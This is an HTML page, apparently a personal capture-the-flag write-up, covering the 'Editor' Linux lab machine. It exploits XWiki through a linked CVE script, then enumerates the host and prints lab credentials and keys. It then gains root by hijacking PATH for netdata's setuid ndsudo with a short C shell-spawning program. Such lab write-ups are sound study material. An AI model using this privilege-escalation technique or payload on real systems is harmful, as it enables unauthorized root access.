@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Editor | whoami</title>
+<meta name="keywords" content="">
+<meta name="description" content="Easy Linux">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/writeups/editor-easy-linux/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/editor-easy-linux/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/editor-easy-linux/">
+  <meta property="og:site_name" content="whoami">
+  <meta property="og:title" content="Editor">
+  <meta property="og:description" content="Easy Linux">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Editor">
+  <meta name="twitter:description" content="Easy Linux">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Write-Ups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Editor",
+      "item": "http://localhost:1313/writeups/editor-easy-linux/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Editor",
+  "name": "Editor",
+  "description": "Easy Linux",
+  "keywords": [
+    
+  ],
+  "articleBody": "\nJetty 10.0.20 - a Java-based HTTP server and servlet container, often used to serve Java web applications. From a security standpoint, Jetty 10.0.20 processes new .xml and .war files automatically if uploaded to certain directories (e.g. $JETTY_BASE/webapps/). That can be exploited for RCE if an attacker can upload a crafted XML file - the server deploys and executes it automatically.\nIt uses XWiki 2.1 - an open-source enterprise wiki. Version 15.10.11.\nFound a CVE that works for that version:\nhttps://github.com/gunzf0x/CVE-2025-24893/blob/main/CVE-2024-24893.py\nChecking the rows and columns of our current stty.\n“Breaks out of the limited shell” - https://viperone.gitbook.io/pentest-everything/everything/everything-linux/shell-upgrades. Note: tty shell spawn doesn’t work if the Kali shell is zsh.\nRan linpeas - possibilities:\n/opt/netdata/etc/netdata/.environment /etc/xwiki/cache/infinispan/config.xml /opt/netdata/var/log/netdata/access.log /var/log/nginx/access.log tomcat stuff? /usr/share/openssh/sshd_config Databases, config files:\n956 64 -rw-r--r-- 1 xwiki xwiki 62127 Aug 8 07:48 /var/log/xwiki/2025_08_08.request.log 1044 4 -rw-r--r-- 1 xwiki xwiki 3710 Jul 29 12:24 /var/log/xwiki/2025_07_29.jetty.log 1054 588 -rw-r--r-- 1 xwiki xwiki 595797 Aug 8 08:02 /var/log/xwiki/2025_08_08.jetty.log xwiki@editor:~/data$ cat configuration.properties xwiki.authentication.validationKey = \\uBF48\\u0EE2\\u03FE\\u4B0F\\u3C8E\\u35DA\\uEEB8\\u4013\\u1E90\\uF9A7\\u4040\\u28EA\\uD217\\u288BF\\u6AF7\\u377E\\u295C\\uC98D\\u17FB5\\uD3D4\\u967F\\uB8DE\\u955B\\uD54B\\uEE55\\u890D\\uAFFC\\u993B\\u1C49\\u9B87 xwiki.authentication.encryptionKey = \\uC327\\u7B18\\u1FFE\\u913D\\uEDBD\\u6C85\\uE778\\uD7C6\\u91D0\\uA56F\\uE1CB\\u014B\\uD03E\\u9E5D\\uED9D\\uB44A\\u3A0C\\u1C76\\uF0D6\\u8289\\u645F\\u6EB8\\u00EB\\u99DA\\u589E\\uE3CE\\uC24A\\u9486\\u5EAB\\u2E85\\uCCEB\\uAF4D Databases - login database. start_xwiki.sh seems to contain code to start xwiki on relevant ports. There’s an internal debug instance of xwiki running? - start_xwiki_debug.sh.\noliver password = theEd1t0rTeam99\nOliver is part of the “netdata” group; files in /opt/netdata are owned by the netdata group. Interesting: netdata.api.key = 6c6fd886-4a06-11f0-9b17-005056b42a8d.\nnetdata is a real-time monitoring solution for apps and infrastructure. netdata.public.unique.id = 6c5c7d22-4a06-11f0-9b17-005056b42a8d.\nLooked for netcat / port forwarding to see what’s happening.\nFrom above, netcat was running on port 49246?? (That was wrong.) Port 3306:\nSearched online for port forwarding into a netdata instance - the port info is in /etc/netdata/netdata.conf, or in this case /opt/netdata/etc/netdata/netdata.conf under [web]. The port was 19999.\nClear indication at the top that this version of netdata has vulnerabilities. Searching “netdata vulnerabilities” points to an issue with the way the ndsudo executable works. Location of ndsudo:\nWe have execute permissions on ndsudo and the setuid bit is set - meaning we can execute it as root.\nCreated nvme:\nChanged the path so ndsudo would use our copy:\nexport PATH=\"/tmp:$PATH\" chmod +x /tmp/nvme Also changed the file to just /bin/bash which is easier. This did not work though - nvme ran, but as oliver, not root, for some reason.\nSo I created a binary locally in C:\n#include #include #include int main() { setuid(0); setgid(0); system(\"/bin/sh\"); return 0; } and transferred it to the target at /tmp/nvme.\nThis time ./ndsudo nvme-list gave the root shell!\nWhy? The SUID bit allows a program to run with the permissions of the file’s owner, but the Linux kernel intentionally ignores the SUID bit on shell scripts to prevent a wide range of privesc attacks. The C binary worked; the bash script didn’t.\n",
+  "wordCount" : "451",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/editor-easy-linux/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "whoami",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="whoami (Alt + H)">whoami</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/htb/" title="HTB">
+                    <span>HTB</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Editor
+    </h1>
+    <div class="post-description">
+      Easy Linux
+    </div>
+  </header> 
+  <div class="post-content md-content"><p><img alt="Editor.png" loading="lazy" src="/writeups/editor-easy-linux/Editor.png"></p>
+<p>Jetty 10.0.20 - a Java-based HTTP server and servlet container, often used to serve Java web applications. From a security standpoint, Jetty 10.0.20 processes new <code>.xml</code> and <code>.war</code> files automatically if uploaded to certain directories (e.g. <code>$JETTY_BASE/webapps/</code>). That can be exploited for RCE if an attacker can upload a crafted XML file - the server deploys and executes it automatically.</p>
+<p><img alt="Editor-1.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-1.png">
+<img alt="Editor-2.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-2.png">
+<img alt="Editor-3.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-3.png"></p>
+<p>It uses XWiki 2.1 - an open-source enterprise wiki. Version 15.10.11.</p>
+<p><img alt="Editor-4.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-4.png"></p>
+<p>Found a CVE that works for that version:</p>
+<p><a href="https://github.com/gunzf0x/CVE-2025-24893/blob/main/CVE-2024-24893.py">https://github.com/gunzf0x/CVE-2025-24893/blob/main/CVE-2024-24893.py</a></p>
+<p><img alt="Editor-5.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-5.png">
+<img alt="Editor-6.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-6.png"></p>
+<p><img alt="Editor-7.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-7.png"></p>
+<p>Checking the rows and columns of our current stty.</p>
+<p><img alt="Editor-8.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-8.png"></p>
+<p>&ldquo;Breaks out of the limited shell&rdquo; - <a href="https://viperone.gitbook.io/pentest-everything/everything/everything-linux/shell-upgrades">https://viperone.gitbook.io/pentest-everything/everything/everything-linux/shell-upgrades</a>. Note: tty shell spawn doesn&rsquo;t work if the Kali shell is zsh.</p>
+<p><img alt="Editor-9.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-9.png"></p>
+<p>Ran linpeas - possibilities:</p>
+<p><img alt="Editor-10.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-10.png">
+<img alt="Editor-11.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-11.png"></p>
+<ul>
+<li><code>/opt/netdata/etc/netdata/.environment</code></li>
+<li><code>/etc/xwiki/cache/infinispan/config.xml</code></li>
+<li><code>/opt/netdata/var/log/netdata/access.log</code></li>
+<li><code>/var/log/nginx/access.log</code></li>
+<li>tomcat stuff?</li>
+<li><code>/usr/share/openssh/sshd_config</code></li>
+</ul>
+<p>Databases, config files:</p>
+<p><img alt="Editor-12.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-12.png"></p>
+<pre tabindex="0"><code>      956     64 -rw-r--r--   1 xwiki    xwiki       62127 Aug  8 07:48 /var/log/xwiki/2025_08_08.request.log
+     1044      4 -rw-r--r--   1 xwiki    xwiki        3710 Jul 29 12:24 /var/log/xwiki/2025_07_29.jetty.log
+     1054    588 -rw-r--r--   1 xwiki    xwiki      595797 Aug  8 08:02 /var/log/xwiki/2025_08_08.jetty.log
+</code></pre><pre tabindex="0"><code>xwiki@editor:~/data$ cat configuration.properties 
+xwiki.authentication.validationKey = \uBF48\u0EE2\u03FE\u4B0F\u3C8E\u35DA\uEEB8\u4013\u1E90\uF9A7\u4040\u28EA\uD217\u288BF\u6AF7\u377E\u295C\uC98D\u17FB5\uD3D4\u967F\uB8DE\u955B\uD54B\uEE55\u890D\uAFFC\u993B\u1C49\u9B87
+xwiki.authentication.encryptionKey = \uC327\u7B18\u1FFE\u913D\uEDBD\u6C85\uE778\uD7C6\u91D0\uA56F\uE1CB\u014B\uD03E\u9E5D\uED9D\uB44A\u3A0C\u1C76\uF0D6\u8289\u645F\u6EB8\u00EB\u99DA\u589E\uE3CE\uC24A\u9486\u5EAB\u2E85\uCCEB\uAF4D
+</code></pre><p>Databases - login database. <code>start_xwiki.sh</code> seems to contain code to start xwiki on relevant ports. There&rsquo;s an internal debug instance of xwiki running? - <code>start_xwiki_debug.sh</code>.</p>
+<p><img alt="Editor-13.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-13.png"></p>
+<p><img alt="Editor-14.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-14.png"></p>
+<p>oliver password = <code>theEd1t0rTeam99</code></p>
+<p><img alt="Editor-15.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-15.png"></p>
+<p>Oliver is part of the &ldquo;netdata&rdquo; group; files in <code>/opt/netdata</code> are owned by the netdata group. Interesting: <code>netdata.api.key</code> = <code>6c6fd886-4a06-11f0-9b17-005056b42a8d</code>.</p>
+<p><img alt="Editor-16.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-16.png"></p>
+<p>netdata is a real-time monitoring solution for apps and infrastructure. <code>netdata.public.unique.id</code> = <code>6c5c7d22-4a06-11f0-9b17-005056b42a8d</code>.</p>
+<p>Looked for netcat / port forwarding to see what&rsquo;s happening.</p>
+<p><img alt="Editor-17.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-17.png"></p>
+<p>From above, netcat was running on port 49246?? (That was wrong.) Port 3306:</p>
+<p><img alt="Editor-18.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-18.png"></p>
+<p>Searched online for port forwarding into a netdata instance - the port info is in <code>/etc/netdata/netdata.conf</code>, or in this case <code>/opt/netdata/etc/netdata/netdata.conf</code> under <code>[web]</code>. The port was 19999.</p>
+<p><img alt="Editor-19.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-19.png"></p>
+<p>Clear indication at the top that this version of netdata has vulnerabilities. Searching &ldquo;netdata vulnerabilities&rdquo; points to an issue with the way the <code>ndsudo</code> executable works. Location of ndsudo:</p>
+<p><img alt="Editor-20.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-20.png"></p>
+<p><img alt="Editor-21.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-21.png"></p>
+<p>We have execute permissions on <code>ndsudo</code> and the setuid bit is set - meaning we can execute it as root.</p>
+<p><img alt="Editor-22.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-22.png"></p>
+<p>Created <code>nvme</code>:</p>
+<p><img alt="Editor-23.png" loading="lazy" src="/writeups/editor-easy-linux/Editor-23.png"></p>
+<p>Changed the path so ndsudo would use our copy:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">&#34;/tmp:</span><span class="nv">$PATH</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">chmod +x /tmp/nvme
+</span></span></code></pre></div><p>Also changed the file to just <code>/bin/bash</code> which is easier. This did not work though - nvme ran, but as oliver, not root, for some reason.</p>
+<p>So I created a binary locally in C:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt; </span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>and transferred it to the target at <code>/tmp/nvme</code>.</p>
+<p>This time <code>./ndsudo nvme-list</code> gave the root shell!</p>
+<p><strong>Why?</strong> The SUID bit allows a program to run with the permissions of the file&rsquo;s owner, but the Linux kernel intentionally ignores the SUID bit on shell scripts to prevent a wide range of privesc attacks. The C binary worked; the bash script didn&rsquo;t.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">whoami</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
